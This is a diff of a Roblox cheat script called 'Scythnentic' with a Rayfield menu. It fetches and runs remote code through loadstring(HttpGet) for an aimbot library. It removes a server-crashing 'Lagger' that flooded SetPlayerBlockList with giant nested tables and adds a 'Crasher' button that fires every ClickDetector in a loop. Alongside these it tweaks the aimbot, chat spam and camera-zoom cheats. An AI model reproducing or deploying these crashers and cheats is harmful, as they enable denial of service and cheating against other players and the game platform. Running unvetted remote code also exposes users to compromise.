@@ -54,10 +54,23 @@ local Sense = loadstring(game:HttpGet('https://sirius.menu/sense'))()
 local Aimbot = loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Aimbot-V3/main/src/Aimbot.lua"))()
 local cheatname = "Scythnentic"
 local version = "Version 3.5 | REBIRTH REWRITE"
-local Message = "+2 games\n+ Added Built-In AimbotV3 Script\n+ Added Executor Specification\n~ Improved FPS Unlocker\n~ Copytoclip gameID\n~ Bugfix mania"
+local Message = "+2 games\n+ Added Built-In AimbotV3 Script\n+ Added Executor Specification\n~ Improved FPS Unlocker\n~ Copytoclip gameID\n~ Bugfix mania\n~ ETC"
 -- // ...
 
 -- // Prior Functionality \\ --
+function Crash()
+    game:GetService("CoreGui").PurchasePrompt.Enabled = false
+_G.Lag = true
+while _G.Lag do
+for i,v in pairs(workspace:GetDescendants()) do
+			if v:IsA("ClickDetector") then
+				fireclickdetector(v)
+			end
+end
+		wait(1)
+		end
+end
+
 function spin()
 	local Spin = Instance.new("BodyAngularVelocity")
 	Spin.Name = "Spinning"
@@ -298,94 +311,47 @@ local ChatSpammer = Rage:CreateToggle({ Name = "Chat - Spammer", CurrentValue = 
 end,
 })
 local RageLabel2 = Rage:CreateLabel("Script Related")
-local Lagger = Rage:CreateToggle({ Name = "Lagger (May likely crash)", CurrentValue = false, Flag = "x",  Callback = function(Lagger) 
-    CurrentValue = Lagger
-    if CurrentValue == true then
-        Rayfield:Notify({
-            Title = "Lagger",
-            Content = "Enabled",
-            Duration = 6.5,
-            Image = 12995567709,
-            Actions = { -- Notification Buttons
-               Ignore = {
-                  Name = "Okay!",
-                  Callback = function()
-                  print("The user tapped Okay!")
-               end
-            },
-         },
-         })
+local Crasher = Rage:CreateButton({ Name = "Crasher",
+   Callback = function()
+    Rayfield:Notify({
+        Title = "Crasher",
+        Content = "Loading Crash...",
+        Duration = 6.5,
+        Image = 12995567709,
+        Actions = { -- Notification Buttons
+           Ignore = {
+              Name = "Okay!",
+              Callback = function()
+              print("The user tapped Okay!")
+           end
+        },
+     },
+     })
 
-        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("5", "All")
-        wait(1.2)
-        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("4", "All")
-        wait(1.2)
-        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("3", "All")
-        wait(1.2)
-        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("2", "All")
-        wait(1.2)
-        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("1", "All")
-        wait(0.7)
-        print("on")
+    Crash()
 
-        if char then
-            char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
-            wait(0.5)
-            char.HumanoidRootPart.Anchored = CurrentValue
-        end
-        while wait(1.5) do --// don't change it's the best
-            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
-            local function getmaxvalue(val)
-               local mainvalueifonetable = 499999
-               if type(val) ~= "number" then return nil end
-               local calculateperfectval = (mainvalueifonetable/(val+2))
-               return calculateperfectval
-            end
-             
-            local function bomb(tableincrease, tries)
-            local maintable = {}
-            local spammedtable = {}
-             
-            table.insert(spammedtable, {})
-            z = spammedtable[1]
-             
-            for i = 1, tableincrease do
-                local tableins = {}
-                table.insert(z, tableins)
-                z = tableins
-            end
-             
-            local calculatemax = getmaxvalue(tableincrease)
-            local maximum
-             
-            if calculatemax then
-                maximum = calculatemax
-            else
-                maximum = 999999
-            end
-             
-            for i = 1, maximum do
-                table.insert(maintable, spammedtable)
-            end
-             
-            for i = 1, tries do
-                game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
-            end
-        end
-        bomb(289, 55) --// change values if client crashes
-    end
-    else
-        wait(4.5)
-        ts:Teleport(game.PlaceId, p)
-    end
+    Rayfield:Notify({
+        Title = "Crasher",
+        Content = "Ran Crasher",
+        Duration = 6.5,
+        Image = 12995567709,
+        Actions = { -- Notification Buttons
+           Ignore = {
+              Name = "Okay!",
+              Callback = function()
+              print("The user tapped Okay!")
+           end
+        },
+     },
+     })
 end,
 })
 local RageLabel21 = Rage:CreateLabel("Aim Related")
 local Aimbot324 = Rage:CreateToggle({ Name = "Toggle", CurrentValue = false, Flag = "Aimbot324",  Callback = function(Aimboit) 
     CurrentValue = Aimboit
-    if CurrentValue then
+    if CurrentValue == true then
         Aimbot.Load()
-        AimbotToggleCheck = true
+        AimbotToggleCheck = CurrentValue
 
         Aimbot.Settings.Enabled = CurrentValue
         Aimbot.Settings.LockMode = 1
@@ -401,12 +367,12 @@ local Aimbot324 = Rage:CreateToggle({ Name = "Toggle", CurrentValue = false, Fla
         end
     else
         Aimbot.Settings.Enabled = CurrentValue
+        AimbotToggleCheck = CurrentValue
 
         if AimbotToggleCheck == false then
             Aimbot.FOVSettings.Enabled = false
+            Aimbot.Exit()
         end
-
-        Aimbot.Exit()
     end
 end,
 })
@@ -961,7 +927,7 @@ end,
 
 local CameraSlider = Visuals:CreateSlider({
     Name = "Camera Zoomout Farness",
-    Range = {0, 5000},
+    Range = {128, 100000},
     Increment = 1,
     Suffix = "",
     CurrentValue = 16,
@@ -969,6 +935,45 @@ local CameraSlider = Visuals:CreateSlider({
     Callback = function(CurrentValue)
         game.Players.LocalPlayer.CameraMaxZoomDistance = CurrentValue
     end,
+})
+local CamMode = Visuals:CreateToggle({ Name = "Camera Mode", CurrentValue = false, Flag = "CMMMMMM",  Callback = function(CamMode) 
+    enabled = CamMode
+    if enabled == true then
+        game.Players.LocalPlayer.DevCameraOcclusionMode = "Invisicam"
+
+        Rayfield:Notify({
+            Title = "CamMode",
+            Content = "Set to Invisicam",
+            Duration = 6.5,
+            Image = 12995567709,
+            Actions = { -- Notification Buttons
+               Ignore = {
+                  Name = "Okay!",
+                  Callback = function()
+                  print("The user tapped Okay!")
+               end
+            },
+         },
+         })
+    else
+        game.Players.LocalPlayer.DevCameraOcclusionMode = "Zoom"
+
+        Rayfield:Notify({
+            Title = "CamMode",
+            Content = "Set to Zoom",
+            Duration = 6.5,
+            Image = 12995567709,
+            Actions = { -- Notification Buttons
+               Ignore = {
+                  Name = "Okay!",
+                  Callback = function()
+                  print("The user tapped Okay!")
+               end
+            },
+         },
+         })
+    end
+end,
 })
 -- // Visuals
 
